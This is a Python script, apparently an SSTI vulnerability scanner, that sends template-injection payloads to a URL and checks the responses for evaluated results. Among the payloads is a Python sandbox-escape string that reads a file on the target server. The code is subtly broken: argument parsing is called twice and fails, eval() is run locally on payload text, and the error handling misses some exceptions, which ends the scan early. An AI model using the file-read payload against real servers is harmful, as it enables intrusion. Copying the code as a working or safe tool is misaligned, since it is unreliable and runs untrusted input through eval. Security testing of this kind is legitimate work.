import argparse
import requests
import logging
import sys
import re  # Import the regular expression module

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define common template injection payloads
SSTI_PAYLOADS = [
    "{{7*7}}",  # Jinja2/Twig
    "${7*7}",   # Spring/Freemarker/Velocity
    "<%= 7*7 %>", #ERB
    "#{7*7}", #Thymeleaf
    "${{7*7}}", #Handlebars
    "{{''.__class__.__mro__[2].__subclasses__()[40]('./file.txt').read()}}", #Python SSTI - Example
    "<% print(7*7) %>" #ASP
]

def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="Detects potential Server-Side Template Injection (SSTI) vulnerabilities.")
    parser.add_argument("url", help="The URL to test for SSTI vulnerabilities.")
    parser.add_argument("-d", "--data", help="Data to send in the request body (e.g., 'param1=value1&param2=value2').", default=None)
    parser.add_argument("-H", "--header", action="append", help="Custom header(s) to send with the request (e.g., 'Content-Type: application/json').  Can be specified multiple times.", default=[]) # Allow multiple headers
    parser.add_argument("-m", "--method", help="HTTP method to use (GET or POST). Defaults to GET.", default="GET", choices=['GET', 'POST'])
    parser.add_argument("--timeout", type=int, help="Request timeout in seconds. Defaults to 10.", default=10)
    parser.add_argument("--user-agent", help="Custom User-Agent header.", default="vuln-SSTI-detector")  # Added user-agent
    return parser.parse_args()


def check_ssti(url, data=None, headers=None, method="GET", timeout=10, user_agent="vuln-SSTI-detector"):  # added user_agent
    """
    Checks for SSTI vulnerabilities by injecting payloads and analyzing the response.
    """
    try:
        if headers is None:
            headers = {}  # Initialize if None to avoid errors
        if not isinstance(headers, list):
            logging.error("Headers must be a list of 'HeaderName: HeaderValue' strings.")
            return False
        
        header_dict = {} #convert to dict for requests
        for header in headers:
            try:
                name, value = header.split(":", 1)  # Split on the first colon only
                header_dict[name.strip()] = value.strip() #strip whitespace
            except ValueError:
                logging.warning(f"Invalid header format: {header}. Skipping.") #warn if can't parse

        header_dict['User-Agent'] = user_agent  # Ensure the user agent is set
        
        for payload in SSTI_PAYLOADS:
            logging.info(f"Testing payload: {payload}")
            
            if method == "GET":
                # Inject payload into URL parameters
                if "?" in url:
                    test_url = url + "&ssti_test=" + payload
                else:
                    test_url = url + "?ssti_test=" + payload

                try:
                    response = requests.get(test_url, headers=header_dict, timeout=timeout)
                    response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
                    content = response.text
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed: {e}")
                    return False
            elif method == "POST":
                # Inject payload into POST data
                post_data = data
                if data: #append payload to existing data
                    post_data = data + "&ssti_test=" + payload
                else:
                    post_data = "ssti_test=" + payload

                try:
                    response = requests.post(url, data=post_data, headers=header_dict, timeout=timeout)
                    response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
                    content = response.text
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed: {e}")
                    return False
            else:
                logging.error(f"Invalid HTTP method: {method}")
                return False
            
            # Check if the payload was evaluated.  Using regex for robustness against whitespace changes
            # and to handle different encodings and representations.

            expected_result = None
            try:
                if payload.startswith("{{") or payload.startswith("<%"):
                    expected_result = str(eval(payload.strip("{{}}").strip("<%>").strip()))  # Try eval on simpler payloads
                elif payload.startswith("${"):
                    expected_result = str(eval(payload.strip("${}")))
                elif payload.startswith("#{"):
                    expected_result = str(eval(payload.strip("#{}" ) ))

            except (SyntaxError, NameError, TypeError) as e: #safe eval.  If this errors, it's likely a more complex payload which will probably not be interpretted by python's eval
                logging.debug(f"Payload {payload} is not a simple arithmetic expression: {e}") #debugging - can't be parsed, so not a simple eval.

            if expected_result:
                regex_expected_result = re.escape(expected_result)
                if re.search(regex_expected_result, content):
                    logging.warning(f"Possible SSTI vulnerability detected! Payload: {payload}, Expected Result: {expected_result}")
                    return True  # Early return if a vulnerability is found
            else:
                if re.search(re.escape(payload), content): # Check if the payload itself is reflected
                    logging.info(f"Payload {payload} reflected in response, but not evaluated.")
                else:
                    logging.debug(f"Payload {payload} not found in response.")  # Debugging

        logging.info("No SSTI vulnerabilities detected.")
        return False

    except Exception as e:
        logging.exception(f"An unexpected error occurred: {e}")  # Log the full exception
        return False


def main():
    """
    Main function to parse arguments and run the SSTI check.
    """
    parser = setup_argparse()
    args = parser.parse_args()

    # Input validation (more can be added)
    if not args.url.startswith("http://") and not args.url.startswith("https://"):
        logging.error("URL must start with http:// or https://")
        sys.exit(1)

    if args.data and args.method == "GET":
        logging.warning("Using --data with GET method. Data will be appended to the URL.") #warning

    #added user_agent to main()
    if check_ssti(args.url, args.data, args.header, args.method, args.timeout, args.user_agent):
        print("Possible SSTI vulnerability found.  Review the logs for more details.") #output to screen if there is one

    else:
        print("No SSTI vulnerabilities detected.")  #output to screen if no vulnerability detected


if __name__ == "__main__":
    """
    Entry point of the script.
    """
    main()


#Usage examples (Not part of the code but helpful)
#python vuln_ssti_detector.py "http://example.com?param=" -H "Content-Type: application/json"
#python vuln_ssti_detector.py "http://example.com" -d "param=value" -m POST
#python vuln_ssti_detector.py "http://example.com" --timeout 5
#python vuln_ssti_detector.py "http://example.com?param=" -H "X-Custom-Header: custom_value" -H "Another-Header: another_value"
#python vuln_ssti_detector.py "http://example.com" --user-agent "MyCustomScanner"